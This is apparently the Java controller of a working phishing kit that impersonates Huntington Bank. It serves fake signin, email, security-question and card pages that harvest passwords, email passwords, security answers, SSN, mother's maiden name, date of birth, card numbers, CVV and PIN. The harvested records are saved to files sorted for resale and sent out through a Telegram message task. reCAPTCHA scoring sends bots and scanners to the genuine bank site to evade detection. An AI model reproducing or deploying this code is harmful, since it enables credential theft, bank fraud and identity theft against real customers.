package com.kidd.bank.web;


import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileAppender;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentUtil;
import cn.hutool.json.JSONUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.kidd.bank.common.IpUtils;
import com.kidd.bank.model.enums.CardType;
import com.kidd.bank.model.enums.FishCountryEnum;
import com.kidd.bank.service.CacheService;
import com.kidd.bank.task.AsyncTask;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.math.BigDecimal;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


@Controller
@Slf4j
@RequestMapping("/huntington")
public class HuntingtonController {
    @Autowired
    private HttpServletRequest request;

    @Autowired
    private AsyncTask asyncTask;


    @Autowired
    private HttpServletResponse response;

    @Autowired
    private CacheService cacheService;


    @Value("${google.secret:6LcEYsUaAAAAAAfTzIt86eSq8Yc0ljLMqzcoJMmF}")
    private String googleSecret;

    @Value("${fish.country:jp}")
    private String fishCountryCode;

    @GetMapping("/signin")
    public Object signin(@RequestHeader("User-Agent") String uaStr) {
        String ip = IpUtils.getIpAddress(request);
        String path = "/root/huntingtonClick.txt";
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("-4")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append(timeStr + ":" + "|" + ip);
        fileAppender.flush();
        return "huntington/signin";
    }

    @GetMapping("/")
    public Object signin2(@RequestHeader("User-Agent") String uaStr) {
        return "index";
    }

    @GetMapping("/count")
    @ResponseBody
    public Object count(@RequestHeader("User-Agent") String uaStr) {
        return "index";
    }
    @RequestMapping("/checkBot")
    @ResponseBody
    public Object checkBotAndRedirect(@RequestHeader("User-Agent") String uaStr, @RequestParam("response") String response) {
        String googleUrl = "https://www.recaptcha.net/recaptcha/api/siteverify";
        String defaulRedirectUrl = "https://www.huntington.com/?Your_Account_Verified";
        String redirectUrl = defaulRedirectUrl;
        Map<String, Object> postParam = new HashMap<>();
        postParam.put("secret", googleSecret);
        postParam.put("response", response);
        String ip = IpUtils.getIpAddress(request);
        //判定爬虫
        try {
            long start = System.currentTimeMillis();
            String result = HttpRequest.post(googleUrl)
                    .form(postParam)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .timeout(3000)//超时，毫秒
                    .execute()
                    .body();
            long end = System.currentTimeMillis();
            JSONObject jsonResult = JSON.parseObject(result);

            //得分
            if (null != jsonResult && jsonResult.containsKey("score")) {
                BigDecimal score = ((BigDecimal) jsonResult.get("score"));
                log.info("checkBot:" + ip + ":" + score + ":" + (end - start) + "ms");
                if (score.doubleValue() >= 0.3) {
                    redirectUrl = "/huntington/signin";
                    addCookie("checkBot", "notBot");
                    cacheService.setCommonCache(ip + "checkBot", 1);
                } else {
                    addCookie("Bot", "Bot");
                    cacheService.setCommonCache(ip + "checkBot", -1);
                }
            } else {
                log.error("checkBot api failed:{},{},cost:{}ms", ip, result, (end - start));
                redirectUrl = "/huntington/signin";
            }
        } catch (Exception e) {
            cacheService.setCommonCache(ip + "checkBot", 1);
            log.error("checkBotAndRedirect ip:{}, error:{}", ip, e.getMessage());
            redirectUrl ="/huntington/signin";
        }
        return redirectUrl;
    }

    @GetMapping("/email")
    public Object email() {
        return "huntington/email";
    }

    @GetMapping("/question")
    public Object question() {
        return "huntington/question";
    }

    @GetMapping("/card")
    public Object card() {
        return "huntington/card";
    }

    @GetMapping("/success")
    public Object success() {
        addCookie("kiddIp", IpUtils.getIpAddress(request));
        return "huntington/success";
    }

    public void addCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);//创建新cookie
        cookie.setMaxAge(60 * 60 * 24 * 7);// 设置存在时间为5分钟
        cookie.setPath("/");//设置作用域
        response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
    }

    @PostMapping("/signin")
    @ResponseBody
    public Object signinPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("username", params.get("username") != null ? params.get("username")[0] : "");
        userInfoMap.put("password", params.get("password") != null ? params.get("password")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("-4")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/huntington-step1/%s.txt", timeStr), userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/email")
    @ResponseBody
    public Object emailPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("fullname", params.get("fullname") != null ? params.get("fullname")[0] : "");
        userInfoMap.put("address", params.get("address") != null ? params.get("address")[0] : "");
        userInfoMap.put("email", params.get("email") != null ? params.get("email")[0] : "");
        userInfoMap.put("email-pass", params.get("epass") != null ? params.get("epass")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("-4")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/huntington-step2/%s.txt", timeStr), userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/question")
    @ResponseBody
    public Object questionPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("question1", params.get("question1") != null ? params.get("question1")[0] : "");
        userInfoMap.put("answer1", params.get("answer1") != null ? params.get("answer1")[0] : "");
        userInfoMap.put("question2", params.get("question2") != null ? params.get("question2")[0] : "");
        userInfoMap.put("answer2", params.get("answer2") != null ? params.get("answer2")[0] : "");
        userInfoMap.put("question3", params.get("question3") != null ? params.get("question3")[0] : "");
        userInfoMap.put("answer3", params.get("answer3") != null ? params.get("answer3")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("-4")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/huntington-step3/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSaveFish("/root/huntington/lack" + timeStr + "/", userInfoMap);
        asyncTask.asyncSaveFish("/root/huntington/sell" + timeStr + "/", userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/card")
    @ResponseBody
    public Object cardPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("ssn", params.get("ssn") != null ? params.get("ssn")[0] : "");
        userInfoMap.put("Mother.s Maiden Name", params.get("mmn") != null ? params.get("mmn")[0] : "");
        userInfoMap.put("dob", params.get("dob") != null ? params.get("dob")[0] : "");
        userInfoMap.put("phone", params.get("phone") != null ? params.get("phone")[0] : "");
        userInfoMap.put("name", params.get("name") != null ? params.get("name")[0] : "");
        userInfoMap.put("card", params.get("card") != null ? params.get("card")[0] : "");
        userInfoMap.put("expire", params.get("expire") != null ? params.get("expire")[0] : "");
        userInfoMap.put("CVV", params.get("cvv") != null ? params.get("cvv")[0] : "");
        userInfoMap.put("pin", params.get("pin") != null ? params.get("pin")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("-4")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/huntington-step4/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSendTgMsg(null, null, userInfoMap);
        asyncTask.asyncSaveFish("/root/huntington/full" + timeStr + "/", userInfoMap);
        asyncTask.asyncSaveFish("/root/huntington/sell" + timeStr + "/", userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    private String getBinInfo(String cardNo) {
        String binInfo = "{}";
        try {
            binInfo = HttpRequest.get("https://lookup.binlist.net/" + cardNo)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .header("Accept-Version", "3")
                    .timeout(20000)//超时，毫秒
                    .execute().body();
        } catch (Exception e) {
            log.error("query bin fail:" + e.getMessage());
        }
        JSONObject jsonObject = JSON.parseObject(binInfo);
        if (jsonObject != null && jsonObject.containsKey("country")) {
            jsonObject.remove("country");
        }
        if (jsonObject != null && jsonObject.containsKey("number")) {
            jsonObject.remove("number");
        }
        return jsonObject.toJSONString();
    }

}
